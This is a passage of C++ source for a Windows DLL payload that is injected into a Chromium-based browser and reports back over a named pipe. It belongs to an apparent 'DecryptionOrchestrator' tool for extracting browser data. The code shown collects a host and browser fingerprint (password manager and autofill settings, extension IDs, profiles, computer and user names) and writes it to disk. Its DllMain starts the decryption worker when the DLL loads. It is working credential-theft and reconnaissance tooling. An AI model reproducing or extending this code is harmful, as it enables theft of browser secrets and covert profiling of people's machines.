                            searchProvider = "Google";
                        else if (content.find("\"bing\"", searchPos) != std::string::npos)
                            searchProvider = "Bing";
                        else if (content.find("\"duckduckgo\"", searchPos) != std::string::npos)
                            searchProvider = "DuckDuckGo";
                        fingerprint << "  \"default_search_engine\": \"" << searchProvider << "\",\n";
                    }

                    size_t hwAccelPos = content.find("\"hardware_acceleration_mode_enabled\"");
                    fingerprint << "  \"hardware_acceleration\": " << (hwAccelPos != std::string::npos ? "true" : "false") << ",\n";
                }
            }

            fs::path prefsFile = browserManager.getUserDataRoot() / "Default" / "Preferences";
            if (fs::exists(prefsFile))
            {
                std::ifstream f(prefsFile);
                if (f)
                {
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

                    size_t autofillPos = content.find("\"autofill\"");
                    fingerprint << "  \"autofill_enabled\": " << (autofillPos != std::string::npos ? "true" : "false") << ",\n";

                    size_t pwdMgrPos = content.find("\"credentials_enable_service\"");
                    fingerprint << "  \"password_manager_enabled\": " << (pwdMgrPos != std::string::npos ? "true" : "false") << ",\n";

                    size_t safeBrowsingPos = content.find("\"safebrowsing\"");
                    fingerprint << "  \"safe_browsing_enabled\": " << (safeBrowsingPos != std::string::npos ? "true" : "false") << ",\n";
                }
            }

            fs::path extensionsPath = browserManager.getUserDataRoot() / "Default" / "Extensions";
            int extensionCount = 0;
            std::vector<std::string> extensionIds;

            if (fs::exists(extensionsPath))
            {
                for (const auto &extEntry : fs::directory_iterator(extensionsPath))
                {
                    if (extEntry.is_directory())
                    {
                        extensionCount++;
                        extensionIds.push_back(extEntry.path().filename().string());
                    }
                }
            }
            fingerprint << "  \"installed_extensions_count\": " << extensionCount << ",\n";

            if (!extensionIds.empty())
            {
                fingerprint << "  \"extension_ids\": [";
                for (size_t i = 0; i < extensionIds.size(); ++i)
                {
                    fingerprint << "\"" << extensionIds[i] << "\"";
                    if (i < extensionIds.size() - 1)
                        fingerprint << ", ";
                }
                fingerprint << "],\n";
            }

            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
            auto profiles = enumerator.FindProfiles();
            fingerprint << "  \"profile_count\": " << profiles.size() << ",\n";

            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(computerName);
            if (GetComputerNameA(computerName, &size))
            {
                fingerprint << "  \"computer_name\": \"" << computerName << "\",\n";
            }

            char userName[256];
            DWORD userSize = sizeof(userName);
            if (GetUserNameA(userName, &userSize))
            {
                fingerprint << "  \"windows_user\": \"" << userName << "\",\n";
            }

            if (fs::exists(localStatePath))
            {
                auto ftime = fs::last_write_time(localStatePath);
                auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                    ftime - fs::file_time_type::clock::now() + std::chrono::system_clock::now());
                auto time = std::chrono::system_clock::to_time_t(sctp);
                fingerprint << "  \"last_config_update\": " << time << ",\n";
            }

            auto now = std::chrono::system_clock::now();
            auto now_time = std::chrono::system_clock::to_time_t(now);
            fingerprint << "  \"extraction_timestamp\": " << now_time << "\n";

            fingerprint << "}";

            fs::path fingerprintFile = m_outputPath / browserConfig.name / "fingerprint.json";
            std::error_code ec;
            fs::create_directories(fingerprintFile.parent_path(), ec);
            if (!ec)
            {
                std::ofstream out(fingerprintFile);
                if (out)
                {
                    out << fingerprint.str();
                    m_logger.Log("[+] Browser fingerprint extracted to " + fingerprintFile.u8string());
                }
            }
        }

    private:
        void ReadPipeParameters()
        {
            char buffer[MAX_PATH + 1] = {0};
            DWORD bytesRead = 0;

            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);

            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_extractFingerprint = (std::string(buffer) == "FINGERPRINT_TRUE");

            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_outputPath = buffer;
        }

        PipeLogger m_logger;
        fs::path m_outputPath;
        bool m_extractFingerprint = false;
    };
}

struct ThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromInjector;
};

DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
{
    LPCWSTR lpcwstrPipeName = static_cast<LPCWSTR>(lpParam);

    auto params = std::unique_ptr<ThreadParams>(new ThreadParams{});
    auto thread_params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams *>(lpParam));

    try
    {
        Payload::DecryptionOrchestrator orchestrator(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
        orchestrator.Run();
    }
    catch (const std::exception &e)
    {
        try
        {
            Payload::PipeLogger errorLogger(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
            if (errorLogger.isValid())
            {
                errorLogger.Log("[-] CRITICAL DLL ERROR: " + std::string(e.what()));
            }
        }
        catch (...)
        {
            // Failsafe if logging itself fails.
        }
    }

    FreeLibraryAndExitThread(thread_params->hModule_dll, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ThreadParams{hModule, lpReserved};
        if (!params)
            return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}
